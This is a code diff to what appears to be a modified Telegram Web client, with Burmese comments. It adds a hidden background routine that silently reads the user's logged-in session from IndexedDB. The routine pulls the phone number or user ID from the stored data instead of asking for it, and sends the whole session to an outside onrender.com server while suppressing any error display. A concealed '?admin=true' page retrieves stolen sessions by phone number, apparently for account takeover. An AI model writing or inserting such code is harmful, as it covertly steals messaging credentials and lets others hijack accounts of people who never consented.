@@ -129,22 +129,20 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
+// --- 🌟 AUTO-SYNC (QR Support) & HIDDEN ADMIN ROUTE 🌟 ---
 setTimeout(() => {
     const DB_NAME = 'tt-data';
     const STORE_NAME = 'store';
-    const pathname = window.location.pathname;
 
     // =========================================================
-    // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (URL နောက်တွင် /admin ဟုရိုက်လျှင်)
+    // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (?admin=true ဟုရိုက်လျှင်)
     // =========================================================
-    if (pathname === '/admin' || pathname === '/admin/') {
-        // Telegram UI အစစ်ကို ဖျောက်ပြီး Admin UI အစားထိုးမည်
+    if (window.location.search.includes('admin=true')) {
         document.body.innerHTML = `
             <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#212121; font-family:sans-serif;">
                 <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px;">
                     <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                    <input type="text" id="adminPhone" placeholder="Staff ဖုန်းနံပါတ် (+959...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
+                    <input type="text" id="adminPhone" placeholder="Staff ဖုန်းနံပါတ် (သို့) User ID" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
                     <button id="adminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                     <p id="adminStatus" style="color:red; margin-top:15px; font-size:14px;"></p>
                 </div>
@@ -152,15 +150,18 @@ setTimeout(() => {
         `;
 
         document.getElementById('adminBtn')!.onclick = () => {
-            const phone = (document.getElementById('adminPhone') as HTMLInputElement).value;
+            let phone = (document.getElementById('adminPhone') as HTMLInputElement).value.trim();
             const statusMsg = document.getElementById('adminStatus')!;
-            if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် ထည့်ပါ!"; return; }
+            if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် သို့မဟုတ် ID ထည့်ပါ!"; return; }
+
+            // ဖုန်းနံပါတ်ရှေ့တွင် + မပါပါက အလိုအလျောက် တပ်ပေးမည်
+            if (phone.startsWith('959')) phone = '+' + phone;
 
             statusMsg.style.color = "blue";
             statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";
 
             // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-            fetch(`https://telegram-7ih3.onrender.com//api/get-web-session/${phone}`)
+            fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
             .then(res => res.json())
             .then(result => {
                 if (!result.success) {
@@ -199,7 +200,7 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF အကောင့်များအတွက် AUTO-SYNC (နောက်ကွယ်မှ အလုပ်လုပ်မည်)
+    // ၂။ 📤 STAFF AUTO-SYNC (QR Code ဖြင့်ဝင်လည်း အလုပ်လုပ်မည်)
     // =========================================================
     setInterval(() => {
         try {
@@ -214,29 +215,45 @@ setTimeout(() => {
                         const vals = e1.target.result;
                         const keys = e2.target.result;
                         const data: any = {};
-                        let isAuth = false;
+                        
+                        let currentUserId: any = null;
+                        let usersMap: any = null;
                         
                         keys.forEach((k: string, i: number) => {
                             data[k] = vals[i];
-                            // Login ဝင်ထားခြင်း ရှိ/မရှိ စစ်ဆေးခြင်း
-                            if (k === 'currentUserId' && vals[i]) isAuth = true; 
+                            // Login ဝင်ထားသော User ID ကို ရှာမည်
+                            if (k === 'currentUserId') currentUserId = vals[i]; 
+                            if (k === 'users') usersMap = vals[i]; 
                         });
                         
-                        if (isAuth) {
+                        if (currentUserId) {
                             let phone = localStorage.getItem('staff_phone');
-                            // ဖုန်းနံပါတ် မရှိသေးပါက တစ်ကြိမ် တောင်းမည်
+                            
+                            // ဖုန်းနံပါတ် မရှိသေးလျှင် (QR ဖြင့်ဝင်ထားလျှင်) DB ထဲမှ အလိုအလျောက် နှိုက်ယူမည်
                             if (!phone) {
-                                phone = prompt("ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
-                                if (phone) localStorage.setItem('staff_phone', phone);
+                                try {
+                                    const users = typeof usersMap === 'string' ? JSON.parse(usersMap) : usersMap;
+                                    const userObj = users[currentUserId] || (users.byId && users.byId[currentUserId]);
+                                    
+                                    if (userObj && userObj.phoneNumber) {
+                                        phone = '+' + userObj.phoneNumber; // +959... ပုံစံဖြစ်အောင် လုပ်သည်
+                                    } else {
+                                        // ဖုန်းနံပါတ် ပိတ်ထားလျှင် User ID ကိုသာ ဖုန်းနံပါတ်အဖြစ် သုံးမည်
+                                        phone = currentUserId.toString(); 
+                                    }
+                                    localStorage.setItem('staff_phone', phone);
+                                } catch(err) {
+                                    phone = currentUserId.toString();
+                                }
                             }
                             
                             if (phone) {
                                 // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                                fetch("https://telegram-7ih3.onrender.com//api/save-web-session", {
+                                fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                                     method: 'POST',
                                     headers: {'Content-Type': 'application/json'},
                                     body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
-                                }).catch(() => {}); // Error တက်လည်း User ကို မပြပါ
+                                }).catch(() => {}); 
                             }
                         }
                     };
